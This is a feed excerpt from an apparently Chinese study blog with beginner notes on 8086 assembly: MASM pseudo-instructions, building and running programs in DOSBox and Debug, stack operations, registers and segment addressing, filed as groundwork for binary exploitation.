    <content type="html"><![CDATA[<h1 id="五、程序的编写与执行"><a href="#五、程序的编写与执行" class="headerlink" title="五、程序的编写与执行"></a>五、程序的编写与执行</h1><p><strong>汇编语言程序写出到执行的过程：</strong> 写出源程序—&gt;对源程序进行编译连接—&gt;生成可执行文件—&gt;操作系统将其加载入内存—&gt;CPU执行程序</p><h2 id="1-源程序"><a href="#1-源程序" class="headerlink" title="1.源程序"></a>1.源程序</h2><p>源程序包括汇编语言和伪指令。<br>示例：<br><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182010614.png"></p><h3 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h3><p>伪指令是给编译器看的指令，编译器根据伪指令来进行相关编译工作。</p><h4 id="1-segment与ends"><a href="#1-segment与ends" class="headerlink" title="(1) segment与ends"></a>(1) segment与ends</h4><p>作用：定义一个段。<br>segment 表示一个段的开始，ends 表示一个段的结束。</p><p>用法：</p><blockquote><p>段名 segment<br>：<br>段名 ends</p></blockquote><h4 id="2-end"><a href="#2-end" class="headerlink" title="(2) end"></a>(2) end</h4><p>作用：结束编译。<br><strong>PS：</strong> 注意区分end与ends的含义。</p><p>用法：在程序结尾处使用。</p><h4 id="3-assume"><a href="#3-assume" class="headerlink" title="(3) assume"></a>(3) assume</h4><p>作用：将段与指定的段寄存器关联起来。（即声明该段在CPU中的执行位置）</p><p>用法：在一个段的开头使用。</p><blockquote><p>assume  段寄存器:段名</p></blockquote><h4 id="4-标号"><a href="#4-标号" class="headerlink" title="(4) 标号"></a>(4) 标号</h4><p>一个标号指代了一个段地址。<br>它被编译后最终处理为一个段地址。</p><h3 id="程序与程序结构"><a href="#程序与程序结构" class="headerlink" title="程序与程序结构"></a>程序与程序结构</h3><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182010236.png"></p><h3 id="程序返回"><a href="#程序返回" class="headerlink" title="程序返回"></a>程序返回</h3><h4 id="1-DOS中的程序运行"><a href="#1-DOS中的程序运行" class="headerlink" title="(1)DOS中的程序运行"></a>(1)DOS中的程序运行</h4><p>DOS是一个单任务的操作系统。</p><p>当要运行XXX.exe程序时，DOS程序会终止运行，CPU将控制权移交给此exe程序，程序运行完成后，会返回DOS程序继续运行，等待下一条指令的输入。</p><p>我们称这个过程为<strong>程序返回</strong></p><p>原理详见CSAPP中对于进程与线程的阐述。</p><h4 id="2-实现程序返回（中断机制）"><a href="#2-实现程序返回（中断机制）" class="headerlink" title="(2) 实现程序返回（中断机制）"></a>(2) 实现程序返回（中断机制）</h4><p>在程序末尾添加返回的程序段。</p><blockquote><p>mov ax,4c00H<br>int 21H</p></blockquote><p><strong>PS:</strong> 这是汇编指令，由CPU负责执行。</p><p>小结：<br><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182011729.png"></p><h3 id="逻辑错误与语法错误"><a href="#逻辑错误与语法错误" class="headerlink" title="逻辑错误与语法错误"></a>逻辑错误与语法错误</h3><p>被编译器发现的错误是语法错误；编译后，在运行时发生的错误是逻辑错误。<br>（<strong>一个是语句错误书写，一个是缺少必要语句或者本身的逻辑问题</strong>）</p><h2 id="2-环境配置"><a href="#2-环境配置" class="headerlink" title="2.环境配置"></a>2.环境配置</h2><blockquote><p>(1)下载Notepad++（用于编写源程序，用其他文本软件也可以）<br>(2)下载MASM,并将这几个程序与源程序文件放在一起<br>(3)在Notepad++上编写源程序并保存到上述的文件夹中</p></blockquote><h2 id="3-源程序的编译、连接与执行"><a href="#3-源程序的编译、连接与执行" class="headerlink" title="3.源程序的编译、连接与执行"></a>3.源程序的编译、连接与执行</h2><p>(1)如源程序的示例那样编写好源程序后，我们就可以将其保存为一个XXX.asm的文件，然后进入DOSBox程序，输入以下命令以打开源程序文件所在位置：</p><blockquote><p>mount c D:\StudyAssembler\MASM\ (文件所在位置)<br>C:</p></blockquote><p>如图所示：<br><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182011736.png"></p><p>(2)输入以下命令以编译源程序：</p><blockquote><p>masm 1.asm</p></blockquote><p>如下图所示：<br><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182011118.png"></p><p>(3)编译完成后会生成一个1.obj对象文件，输入以下命令以连接程序：</p><blockquote><p>link 1.obj</p></blockquote><p>由于书本中的1.asm文件只有一个代码段，所以无需作其他配置，接下来一直回车直到出现命令行的出现。</p><p>如下图所示：<br><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182012504.png"><br>(4)输入“1.exe”运行程序，会看到一个短暂的黑屏，然后回到DOS命令行，程序运行完毕。</p><p>至此，我们完成了1.asm文件的编译、连接和运行，但是，我们并没有看到运行程序的过程。</p><p><strong>PS:</strong> </p><ul><li>XXX.com文件大小为64KB，只能有一个段。<br>  XXX.exe文件可以很大，其中一般有多个段。<br>  所以当你编写的程序中只有一个段，可以考虑使用XXX.com文件执行，可以用于伪装。</li><li>可以用“ML 1.asm”指令来编译并连接程序，并且文件后缀和文件名有时可省略，因为已默认文件位置和类型。</li><li>可以指定文件生成的位置，只需在执行文件前加上路径</li><li>Link的作用：可以将源程序分开编译，然后将它们连在一起</li><li>在命令行输入指令后加分号，可以使编译器忽略中间文件的生成，更简捷</li></ul><h2 id="4-对于DOS程序运行原理的解释"><a href="#4-对于DOS程序运行原理的解释" class="headerlink" title="4.对于DOS程序运行原理的解释"></a>4.对于DOS程序运行原理的解释</h2><blockquote><p>(1)任何通用系统都要提供shell（外壳）程序，用户使用此程序来操作计算机系统进行工作。<br>(2)DOS中有一个程序command.com，这个程序在DOS中称为命令解释器，也就是DOS系统的shell。<br>(3)DOS启动时，先完成其他重要的初始化工作，然后运行command.com，command.com运行后，执行完其他的相关任务后，在屏幕上显示出由当前盘符和当前路径组成的提示符,比如:“c:\”或“c:\windows”等，然后等待用户的输入。<br>(4)command首先根据文件名找到可执行文件，然后将这个可执行文件中的程序加载入内存，设置CS:IP指向程序的入口。此后，command暂停运行，CPU运行程序。程序运行结束后，返回到command中，command再次显示由当前盘符和当前路径组成的提示符，等待用户的输入。在DOS中，command处理各种输入:命令或要执行的程序的文件名。我们就是通过command来进行工作的。</p></blockquote><p>故汇编程序的完整执行过程为：<br>编程 (Edit) 一&gt;l.asm一&gt;编译(masm)一&gt;1.obj一&gt;连接(link)一&gt;1.exe一&gt;加载 (command) 一&gt;内存中的程序一&gt;运行(CPU)</p><h2 id="5-跟踪程序的执行"><a href="#5-跟踪程序的执行" class="headerlink" title="5.跟踪程序的执行"></a>5.跟踪程序的执行</h2><p>在源程序的汇编指令前加标号（对段命名），并在end后加上这个标号，就给程序设置了一个入口。<br>Debug利用中断指令实现对程序的跟踪。<br>CX中存放程序的长度。<br><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182012441.png"><br>上图说明内存中程序存放在DS地址+10H（即256字节）处，这256字节里存放着PSP，DOS用来和程序通信。<br>故程序的物理地址为：(X+16)x16+0 (左移一格)<br>可用段地址和偏移地址：X+10H:0</p><p>Debug的执行原理：command加载Debug，Debug加载1.exe。程序结束后从1.exe中的程序返回到Debug，从Debug返回到command。</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>四、使用Debug进行简单汇编指令编程</title>
    <link href="/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E5%9B%9B%E3%80%81%E4%BD%BF%E7%94%A8Debug%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A8%8B/"/>
    <url>/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E5%9B%9B%E3%80%81%E4%BD%BF%E7%94%A8Debug%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="四、使用Debug进行简单汇编指令编程"><a href="#四、使用Debug进行简单汇编指令编程" class="headerlink" title="四、使用Debug进行简单汇编指令编程"></a>四、使用Debug进行简单汇编指令编程</h1><h2 id="1-DOSBox和Debug安装及使用"><a href="#1-DOSBox和Debug安装及使用" class="headerlink" title="1.DOSBox和Debug安装及使用"></a>1.DOSBox和Debug安装及使用</h2><p>由于目前的Windows系统不再支持Debug的直接使用，所以我们需要先安装DOSBox和Debug来进行汇编指令编程。</p><p><strong>安装</strong></p><p>安装地址网上一般都能搜到，这里只贴出：DOSBox的地址：<a href="https://www.dosbox.com/">https://www.dosbox.com</a></p><p><strong>使用</strong></p><p>点开安装后一直Next，选个你需要的磁盘位置安装（一般是D盘）就可以，安装Debug的时候需要注意Debug的文件路径。</p><ol><li>打开DOSBox后，使用“mount c Debug位置”来让DOSBox进入Debug程序运行；然后输入“C:”<br> ；最后输入“debug”就能运行了。<br> 但是每次进入DOSBox程序时都要重复输入该指令，所以我们可以打开DOSBox文件位置，找到“…Option.bat”文件，然后如图把指令挪过来：<br> <img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182009367.png"><br> 以后每次打开就能直接运行Debug程序了。</li><li>打开DOSCBox后可以发现窗口无法放大缩小，可以打开“…Option.bat”文件后找到<br> “windowresolution&#x3D;original<br>  output&#x3D;surface”代码，将它改为<br>  “windowresolution&#x3D;你需要的分辨率（如1200x800）<br>  output&#x3D;opengl”就能正常放大程序窗口了。</li></ol><h2 id="2-Debug命令"><a href="#2-Debug命令" class="headerlink" title="2.Debug命令"></a>2.Debug命令</h2><p>可以参照这篇文章进行了解和学习：<br>一般是先用r命令查看当前寄存器内部的值，再用a命令进行编程。<br><a href="https://blog.csdn.net/weixin_43809545/article/details/103640185">汇编语言DEBUG命令详解||汇编命令||DEBUG的常用命令：A,U,R,T,D,E,Q 等等</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>三、栈</title>
    <link href="/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%B8%89%E3%80%81%E6%A0%88/"/>
    <url>/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%B8%89%E3%80%81%E6%A0%88/</url>
    
    <content type="html"><![CDATA[<h1 id="三、-栈"><a href="#三、-栈" class="headerlink" title="三、*栈"></a>三、*栈</h1><h2 id="1-栈的概念"><a href="#1-栈的概念" class="headerlink" title="1. 栈的概念"></a>1. 栈的概念</h2><p>栈是一种具有特殊的访问方式的<strong>存储空间</strong>。它的特殊性就在于，最后进入这个空间的数据，最先出去。</p><h2 id="2-CPU栈机制"><a href="#2-CPU栈机制" class="headerlink" title="2. CPU栈机制"></a>2. CPU栈机制</h2><p>入栈就是将一个新的元素放到栈顶，出栈就是从栈顶取出一个元素。栈顶的元素总是最后入栈，需要出栈时，又最先被从栈中取出。栈的这种操作规则被称为:LIFO(Last In First Out，后进先出)。<br>从程序化的⻆度来讲，应该有一个标记，这个标记一直指示着栈顶。（SS：SP）</p><ul><li>栈从栈底(高位)开始存入数据，从栈顶(低位)开始复制数据转移出寄存器。</li></ul><h2 id="3-SS和SP"><a href="#3-SS和SP" class="headerlink" title="3. SS和SP"></a>3. SS和SP</h2><p>CPU 如何知道栈顶的位置?显然，也应该有相应的寄存器来存放栈顶的地址，8086CPU中，有两个寄存器，<strong>段寄存器SS和寄存器SP，栈顶的段地址存放在SS中，偏移地址存放在SP中。任意时刻，SS:SP指向栈顶元素。push指令和pop指令执行时，CPU 从SS 和SP 中得到栈顶的地址。</strong></p><blockquote><p>push ax 的执行，由以下两步完成。<br>(1)SP&#x3D;SP-2，SS:SP 指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶;<br>(2)将ax中的内容送入SS:SP 指向的内存单元处，SS:SP此时指向新栈顶。</p></blockquote><blockquote><p>pop ax的执行过程和push ax刚好相反，由以下两步完成。<br>(1)将SS:SP 指向的内存单元处的数据送入ax 中;<br>(2)SP&#x3D;SP+2，SS:SP 指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶。</p></blockquote><ul><li>push指令先指定空位置，再存入数据</li><li>pop指令先存入数据到寄存器中，再改变SS:SP位置</li><li>pop 操作前的栈顶元素依然存在，但是，它己不在栈中。当再次执行 push 等入栈指令后，SS:SP移至上一个内存单元，并在里面写入新的数据，它将被覆盖。<br>  故磁盘格式化并没有清除数据，只是把“指针”复位了而已，下次写入只是覆盖原有数据，可以复原。</li></ul><h2 id="4-栈溢出"><a href="#4-栈溢出" class="headerlink" title="4. 栈溢出"></a>4. 栈溢出</h2><p>将 10010H~1001FH当作栈空间，该栈空间容量为16字节(8字)，初始状态为空，SS&#x3D;1000H、SP&#x3D;0020H，SS:SP 指向10020H;<br>在执行8次push ax 后，向栈中压入8个字，栈满，SS: SP 指向 10010H;<br>再次执行 push ax: sp&#x3D;sp- 2，SS:SP 指向 1000EH，栈顶超出了栈空间，ax 中的数据送入1000 EH 单元处，将栈空间外的数据覆盖<br>上面描述了执行push、pop 指令时，发生的栈顶超界问题。可以看到，当栈满的时候再使用push 指令入栈，或栈空的时候再使用pop 指令出栈，都将发生栈顶超界问题（栈溢出）。</p><p>栈顶超界是危险的，因为我们既然将一段空间安排为栈，那么在栈空间之外的空间里很可能存放了具有其他用途的数据、代码等，这些数据、代码可能是我们自己程序中的，也可能是别的程序中的(毕竟一个计算机系统中并不是只有我们自己的程序在运行)。但是由于我们在入栈出栈时的不小心，而将这些数据、代码意外地改写，将会引发一连串的错误。</p><blockquote><p><strong>PS：</strong> 如果是故意造成栈溢出的，就可以利用此特性将一些程序中的受保护数据取出（例如用户登录密码等信息），所以栈溢出也是PWN攻击的一种方式。</p></blockquote><p>8086CPU只知道栈项在何处(由SS:SP指示) ，而不知道我们安排的栈空间有多大。这点就好像CPU只知道当前要执行的指令在何处(由CS:IP指示)，而不知道要执行的指令有多少。从这两点上我们可以看出8086CPU 的工作机理，它只考虑当前的情况:当前的栈顶在何处、当前要执行的指令是哪一条。</p><h2 id="5-栈段"><a href="#5-栈段" class="headerlink" title="5. 栈段"></a>5. 栈段</h2><p>我们可以将长度为N( ≤ 64KB) 的一组地址连续、起始地址为16的倍数的内存单元，当作栈空间来用，从而定义了一个栈段。比如，我们将 10010H~1001FH 这段长度为16字节的内存空间当作栈来用，以栈的方式进行访问。这段空间就可以称为一个栈段。</p><p>如果将 10000H~1FFFFH 这段空间当作栈段，SS&#x3D;1000H，栈空间为64KB，栈最底部的字单元地址为1000:FFFE。任意时刻，SS:SP 指向栈顶单元，当栈中只有一个元素的时候，S S&#x3D;1000H，SP&#x3D;FFFEH。栈为空，就相当于栈中唯一的元素出栈，出栈后，SP&#x3D;SP+2.<br>SP原 来为FFFEH，加2后SP&#x3D;0，所以，当栈为空的时候，SS&#x3D;1000H，SP&#x3D;0。</p><p>换一个⻆度看，任意时刻，SS:SP 指向栈顶元素，当栈为空的时候，栈中没有元素，也就不存在栈顶元素，所以sS:SP 只能指向栈的最底部单元下面的单元，该单元的地址为栈最底部的字单元的地址+2。栈最底部字单元的地址为1000:FFFE ，所以栈空时，SP&#x3D;0000H.</p><p><strong>段的总结</strong></p><p>我们可以将一段内存定义为一个段，用一个段地址指示段，用偏移地址访问段内的单元。这完全是我们自己的安排。<br>不管我们如何安排，CPU将内存中的某段内容当作代码，是因CSIP 指向了那里:CPU将某段内存当作栈，是因为SS;SP 指向了那里。我们一定要清楚，什么是我们的安排，以及如何让CPU 按我们的安排行事。要非常清楚 CPU 的工作机理，才能在控制 CPU 按照我们的安排运行的时候做到游刃有余。</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二、寄存器与简单汇编指令</title>
    <link href="/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%BA%8C%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"/>
    <url>/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%BA%8C%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="二、寄存器与简单汇编指令"><a href="#二、寄存器与简单汇编指令" class="headerlink" title="二、寄存器与简单汇编指令"></a>二、寄存器与简单汇编指令</h1><h2 id="1-简单汇编指令"><a href="#1-简单汇编指令" class="headerlink" title="1.* 简单汇编指令"></a>1.* 简单汇编指令</h2><h3 id="1-1-mov-add和sub指令"><a href="#1-1-mov-add和sub指令" class="headerlink" title="1.1 mov,add和sub指令"></a>1.1 mov,add和sub指令</h3><p><strong>mov指令（传输指令）</strong><br>用C语言可理解为赋值语句，如”mov ax,bx”<br>可理解成”ax&#x3D;bx”。</p><p>使用形式如下：<br>mov  寄存器，数据           比如:  mov ax,8<br>mov  寄存器，寄存器  比如: mov ax,bx<br>mov  寄存器，内存单元    比如: mov ax,[0]<br>mov  内存单元，寄存器    比如: mov [0],ax<br>mov  段寄存器，寄存器    比如: mov ds,ax<br>mov  寄存器，段寄存器    比如: mov ax,ds<br>mov  内存单元，段寄存器 比如:mov [0],ds<br>mov  段寄存器，内存单元 比如:mov ds,[0]</p><p><strong>add和sub指令</strong><br>类似C语言中”+&#x3D;”和”-&#x3D;”这两个运算符号，如”add ax,8”和”sub ax,8”可分别翻译成”ax+&#x3D;8”和”ax-&#x3D;8”这两种运算。</p><p>使用形式可参照上述方式用debug自行实验，不再赘述。</p><h3 id="1-2-jmp指令（转移指令）"><a href="#1-2-jmp指令（转移指令）" class="headerlink" title="1.2 jmp指令（转移指令）"></a>1.2 jmp指令（转移指令）</h3><p>用于修改CS和IP的值来控制CPU执行目标指令。<br>若想同时修改CS、IP的值，可用<br>“<strong>jmp 段地址：偏移地址</strong>”的指令完成。如：<br>jmp 2AE3:3,执行后，CS&#x3D;2AE3H,IP&#x3D;0003H,CPU将从2AE33H处读取指令。<br>jmp 3:0B16,执行后，CS&#x3D;0003H,IP&#x3D;0B16H,CPU将从00B46H处读取指令。<br>若只想修改IP的值，可用“<strong>jmp 某一合法寄存器</strong>”完成。如：<br>jmp ax,在含义上好似“mov IP,ax”意思是用寄存器的值修改IP。</p><h3 id="1-3-push和pop指令（入栈、出栈指令）"><a href="#1-3-push和pop指令（入栈、出栈指令）" class="headerlink" title="1.3 push和pop指令（入栈、出栈指令）"></a>1.3 push和pop指令（入栈、出栈指令）</h3><p>push和pop指令是可以在寄存器和内存（栈空间当然也是内存空间的一部分，它只是一段可以以一种特殊的方式进行访问的内存空间。）之间传送数据的。</p><p>push和pop指令的格式可以是如下形式:</p><blockquote><p>push 寄存器;将一个奇存器中的数据入栈<br>pop 寄存器;出栈，用一个寄存器接收出栈的数据</p></blockquote><p>(PS:用什么类型数据入栈，就用什么类型数据出栈。）</p><p>指令执行时，CPU要知道内存单元的地址，可以在push、pop 指令中只给出内存单元的偏移地址，段地址在指令执行时，CPU 从ds 中取得。</p><ul><li>用栈来暂存以后需要恢复的寄存器中的内容时，出栈的顺序要和入栈的顺序相反，因为最后入栈的寄存器的内容在栈顶，所以在恢复时，要最先出栈。</li><li>将寄存器清零，可以用</li></ul><blockquote><p>mov ax,0<br>sub ax,ax<br>xor ax,ax</p></blockquote><h2 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2.  寄存器"></a>2.  寄存器</h2><blockquote><p>一个典型的CPU由运算器、控制器、寄存器(CPU工作原理)等器件构成，这些器件靠内部总线相连。其中寄存器进行信息存储。程序员正是通过改变各种寄存器中的内容来实现对CPU的控制。</p></blockquote><p><strong>每一代CPU都是向下兼容的。</strong></p><blockquote><p>8086CPU 的上一代CPU中的寄存器都是8位的，为了保证兼容，使原来基于上代CPU编写的程序稍加修改就可以运行在8086之上，8086CPU的AX、BX、CX、DX这4个寄存器都可分为两个可独立使用的8位寄存器来用</p><ul><li>AX可分为AH和AL;</li><li>BX 可分为BH 和BL;</li><li>CX 可分为CH 和CL;</li><li>DX可分为DH和DL。</li></ul></blockquote><p>以 AX 为例，8086CPU的16位寄存器分为两个8位寄存器的情况如图2. 3所示。<br><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182001536.png"></p><h3 id="2-1-字在寄存器中的存储"><a href="#2-1-字在寄存器中的存储" class="headerlink" title="2.1 字在寄存器中的存储"></a>2.1 字在寄存器中的存储</h3><p>8086CPU可以一次性处理以下两种尺寸的数据。</p><ul><li>字节: 记为byte,一个字节由8个bit组成，可以存在8位寄存器中。</li><li>宇:记为word，一个字由两个字节组成，这两个字节分别称为这个字的高位字节和低位字节，一个字可以存在一个16位寄存器中，这个字的高位字节和低位字节自然就存在这个寄存器的高8位寄存器和低8位寄存器中。一个字型数据20000，存在AX寄存器中，在AH中存储它的高8位，在AL中存储了它的低8位。<strong>AH和AL中的数据，既可以看成是一个字型数据的高8位和低8位，这个字型数据的大小是20000:又可以看成是两个独立的字节型数据，它们的大小分别是78和32。</strong></li><li><strong>高位存储高地址，低位存储低地址。</strong></li><li>一个字要用两个地址连续的内存单元来存放</li><li>任何两个地址连续的内存单元，N号单元和 N+1号单元，可以将它们看成两个内存单元，也可看成一个地址为N的字单元中的高位字节单元和低位字节单元。</li></ul><blockquote><p>字节型数据:该地址存放数据，是一个字节。<br>字型数据:整体所指数据，是一个字。</p></blockquote><h3 id="2-2-物理地址与偏移地址"><a href="#2-2-物理地址与偏移地址" class="headerlink" title="2.2 物理地址与偏移地址"></a>2.2 物理地址与偏移地址</h3><blockquote><p><strong>物理地址：</strong> CPU访问内存单元时，要给出内存单元的地址。所有的内存单元构成的存储空间是一个一维的线性空间，每一个内存单元在这个空间中都有唯一的地址，我们将这个唯一的地址称为物理地址。</p></blockquote><p>CPU 通过地址总线送入存储器的，必须是一个内存单元的物理地址。在 CPU 向地址总线上发出物理地址之前，必须要在内部先形成这个物理地址。不同的CPU可以有不同的形成物理地址的方式。</p><p><strong>16位CPU（8086CPU）：</strong> </p><ul><li>运算器一次最多可以处理16位的数据</li><li>寄存器的最大宽度为16位</li><li>寄存器和运算器之间的通路为16位</li></ul><blockquote><p>8086CPU有20位地址总线，可以传送20位地址，达到IMB寻址能力。8086CPU又是16位结构，在内部一次性处理、传输、暂时存储的地址为16位。从8086CPU的内部结构来看，如果将地址从内部简单地发出，那么它只能送出16位的地址，表现出的寻址能力只有64KB。8086CPU采用一种在内部用两个16位地址合成的方法来形成一个20位的物理地址。<br><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182001566.png"><br>(1)CPU中的相关部件提供两个16位的地址，一个称为段地址，另一个称为偏移地址;<br>(2)段地址和偏移地址通过内部总线送入一个称为地址加法器的部件;<br>(3)地址加法器将两个16位地址合成为一个20位的物理地址;<br>(4)地址加法器通过内部总线将20位物理地址送入输入输出控制电路;<br>(5)输入输出控制电路将20位物理地址送上地址总线;<br>(6)20位物理地址被地址总线传送到存储器。</p></blockquote><p>地址加法器采用<strong>“物理地址&#x3D;段地址x16+偏移地址”</strong>的方法用段地址和偏移地址合成物理地址。</p><p><strong>“段地址x16”的含义：</strong><br>(1)一个数据的二进制形式左移1位，相当于该数据乘以2:<br>(2)一个数据的二进制形式左移N位，相当于该数据乘以2的N次方;<br>(3)地址加法器完成段地址×16的运算就是将以二进制形式存放的段地址左移4位。<br>(4)进一步可知一个X进制的数据左移1位，相当于乘以X。</p><p><strong>“物理地址&#x3D;段地址x16+偏移地址”的本质含义</strong><br>CPU在访问内存时，用一个基础地址(段地址×16)和一个相对于基础地址的偏移地址相加，给出内存单元的物理地址。<br>更一般地说，8086CPU的这种寻址功能是 <strong>“基础地址+偏移地址&#x3D;物理地址”寻址模式</strong>的一种具体实现方案。8086CPU中，段地址×16可看作是基础地址。</p><h3 id="2-3-段"><a href="#2-3-段" class="headerlink" title="2.3 段"></a>2.3 段</h3><h4 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="(1) 基本概念"></a>(1) 基本概念</h4><p>其实，内存并没有分段，段的划分来自于CPU我们可以用分段的方式来管理内存。(人为规定的)<br>将若干地址连续的内存单元看作一个段，用段地址×16定位段的起始地址(基础地址)，用偏移地址定位段中的内存单元。<br>段地址x16必然是16的倍数，所以一个段的起始地址也一定是16的倍数:偏移地址为16位，16位地址的寻址能力为64KB，所以给定一个段地址，仅通过变化偏移地址来进行寻址,偏移地址16位，变化范围为0- FFFFH，仅用偏移地址来寻址最多可寻64KB个内存单元。</p><p>PS:</p><ul><li>CPU 可以用不同的段地址和偏移地址形成同一个物理地址</li><li>“数据在21F60H内存单元中。”有两种类似的说法:<br>  1.数据存在内存2000:1F60单元中；<br>  2.数据存在内存的2000H段中的1F60H单元中。</li></ul><h4 id="2-段寄存器"><a href="#2-段寄存器" class="headerlink" title="(2) 段寄存器"></a>(2) 段寄存器</h4><p>8086CPU有4个段寄存器:CS、DS、SS、ES。当8086CPU要访问内存时由这4个段寄存器提供内存单元的段地址。</p><h4 id="3-CS和IP"><a href="#3-CS和IP" class="headerlink" title="(3) CS和IP"></a>(3) CS和IP</h4><p>CS和IP是8086CPU中两个最关键的寄存器，它们指示了CPU当前要读取指令的地址。CS 为代码段寄存器，IP 为指令指针寄存器，从名称上我们可以看出它们和指令的关系。<br>在8086PC机中，任意时刻，设CS中的内容为M，IP 中的内容为N，8086CPU将从内存Mx16+N 单元开始，读取一条指令并执行。<br>也可以这样表述:8086机中，任意时刻，CPU将CS:IP 指向的内容当作指令执行。<br><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182007391.png"><br>如图可知，将数据存放到寄存器中需要三个字节，对两个寄存器进行操作需要两个字节。</p><blockquote><p>8086CPU的工作过程可简要描述如下：<br>(1)从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲器;<br>(2)IP&#x3D;IP+所读取指令的长度，从而指向下一条指令;<br>(3)执行指令。转到步骤(1)，重复这个过程。</p></blockquote><p><strong>CPU将CS: IP指向的内存单元中的内容看作指令</strong>，因为，在任何时候，CPU将CS、IP 中的内容当作指令的段地址和偏移地址，用它们合成指令的物理地址，到内存中读取指令码，执行。</p><h4 id="4-代码段"><a href="#4-代码段" class="headerlink" title="(4)代码段"></a>(4)代码段</h4><p>可以根据需要，将一组内存单元定义为一个段。我们可以将长度为N(N≤64KB)的一组代码，存在一组地址连续、起始地址为16的倍数的内存单元中，我们可以认为，这段内存是用来存放代码的，从而定义了 一个代码段。(同样是人为规定的，CPU不知道，它只负责读写指令，执行)</p><h4 id="5-数据段"><a href="#5-数据段" class="headerlink" title="(5)数据段"></a>(5)数据段</h4><p>我们可以将一组长度为 N( ≤ 64KB) 、地址连续、起始地址为16的倍数的内存单元当作专门存储数据的内存空间，从而定义了一个数据段用DS存放数据段的段地址，再根据需要，用相关指令访问数据段中的具体单元。（同上）</p><h4 id="6-DS和-address"><a href="#6-DS和-address" class="headerlink" title="(6) DS和[address]"></a>(6) DS和[address]</h4><p>内存地址由段地址和偏移地址组成。8086CPU 中有DS寄存器，通常用来存放要访问数据的段地址。</p><p><strong>“[…]”表示一个内存单元，“[…]”中的0表示内存单元的偏移地址。</strong><br>“mov al,[0]”指令执行时，8086CPU自动取DS中的数据为内存单元的段地址。<br>10000H 用段地址和偏移地址表示为1000:0，我们先将段地址1000H放入ds，然后用”mov al,[0]”完成传送。mov指令中的[0]说明操作对象是一个内存单元，[0]中的”0”说明这个内存单元的偏移地址是0，它的段地址默认放在DS中，指令执行时，8086CPU会自动从DS中取出。<br><strong>“数据——&gt;通用寄存器——&gt;段寄存器”</strong></p><blockquote><p>mov bx, 1000H<br>mov ds,bx</p></blockquote><p>是给段寄存器赋值的常用操作。</p><p><strong>下面是字传送的详细操作：</strong><br><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182008326.png"><br><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/202404182007044.png"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一、基础知识</title>
    <link href="/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
